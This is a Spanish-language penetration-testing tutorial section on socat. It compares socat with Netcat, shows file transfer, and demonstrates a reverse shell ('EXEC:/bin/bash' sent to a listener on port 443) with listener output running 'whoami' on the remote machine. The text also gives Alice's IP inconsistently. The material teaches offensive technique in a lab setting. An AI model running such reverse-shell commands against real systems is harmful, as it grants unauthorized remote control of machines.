# 1.2.2 Socat

**`Socat`** es una utilidad de línea de comandos que establece dos flujos de byte bidireccionales y transfiere datos entre ellos. Para las pruebas de penetración, es similar a Netcat, pero tiene características útiles adicionales.&#x20;

### Netcat vs Socat

Primero, conectémonos a un servidor remoto en el puerto 80 usando Netcat y socat:

{% tabs %}
{% tab title="Netcat" %}
nc \<ip-address> 80
{% endtab %}

{% tab title="Socat" %}
socat - TCP4:\<ip-address>:80
{% endtab %}
{% endtabs %}

Tenga en cuenta que la sintaxis es similar, pero socat requiere el **`-`** para transferir datos entre STDIO y el host remoto, y el protocolo (TCP4). El protocolo, las opciones y el número de puerto están delimitados por dos puntos.

Dado que se requieren privilegios de root para enlazar un agente de escucha a puertos inferiores a 1024, debemos usar sudo al iniciar un agente de escucha en el puerto 443.

{% tabs %}
{% tab title="Netcat" %}
sudo nc -lvp localhost 443
{% endtab %}

{% tab title="Socat" %}
sudo socat TCP4-LISTEN:443 STDOUT
{% endtab %}
{% endtabs %}

La adición requerida tanto del protocolo para el agente de escucha (TCP4-LISTEN) como del argumento STDOUT, que redirige la salida estándar.

### Transferencias de archivos con Socat

Supongamos que Alice necesita enviarle a Bob un archivo llamado tests.txt.&#x20;

Compartiremos el archivo en el puerto **`443`**. En este ejemplo,  los parámetros utilizados:

* **`TCP4-LISTEN`** especifica un agente de escucha IPv4,&#x20;
* **`fork`** crea un proceso secundario una vez que se realiza una conexión con el agente de escucha, lo que permite varias conexiones, y&#x20;
* **`file:`** especifica el nombre de un archivo que se va a transferir:

```
alice@machine:~$ sudo socat TCP4-LISTEN:443,fork file:test.txt
```

Por el lado de Bob, nos conectaremos a la computadora de Alice y recuperaremos el archivo. En este ejemplo, los parámetros utilizados:

* **`TCP4`** especifica IPv4, seguido de la dirección IP de Alice (**`10.11.0.4`**) y el número de puerto de escucha (**`443`**),&#x20;
* **`file:`** especifica el nombre de archivo local en el que se guardará el archivo en el equipo de Bob y&#x20;
* **`create`** específica que se creará un nuevo archivo:

```
bob@machine:~$ socat TCP4:192.168.100.23:443 file:test.txt,create
bob@machine:~$ ls -l test.txt 
-rw-rw-r-- 1 guillermocm guillermocm 476 oct 18 22:39 test.txt
```

### Socat Reverse Shells

Bob iniciará un oyente en el puerto 443. Para hacer esto, proporcionará la opción **`-d -d`** para aumentar la verbosidad (mostrando mensajes fatales, de error, advertencia y aviso), **`TCP4-LISTEN:443`** para crear un agente de escucha IPv4 en el puerto 443 y **`STDOUT`** para conectar la salida estándar (STDOUT) al socket TCP:

```
bob@machine:~$ socat -d -d TCP4-LISTEN:443 STDOUT
2021/10/18 18:01:16 socat[291393] N listening on AF=2 0.0.0.0:443
```

A continuación, Alice utilizará la opción **`EXEC`** de socat (similar a la opción Netcat -e), que ejecutará el programa dado una vez que se establezca una conexión remota. En este caso, Alice enviará un shell inverso /bin/bash (con **`EXEC:/bin/bash`**) al socket de escucha de Bob en 192.168.100.23:443

```
alice@machine:~$ socat TCP4:192.168.100.23:443 EXEC:/bin/bash
```

Una vez conectado, Bob puede ingresar comandos de su sesión de socat, que se ejecutarán en la máquina de Alice.

```
bob@machine:~$ socat -d -d TCP4-LISTEN:443 STDOUT
2021/10/18 18:01:16 socat[291393] N listening on AF=2 0.0.0.0:443
2021/10/18 18:01:17 socat[291393] N accepting connection from AF=2 192.168.100.106:58618 on AF=2 192.168.100.23:443
2021/10/18 18:01:17 socat[291393] N using stdout for reading and writing
2021/10/18 18:01:17 socat[291393] N starting data transfer loop with FDs [6,6] and [1,1]
whoami
alice
```
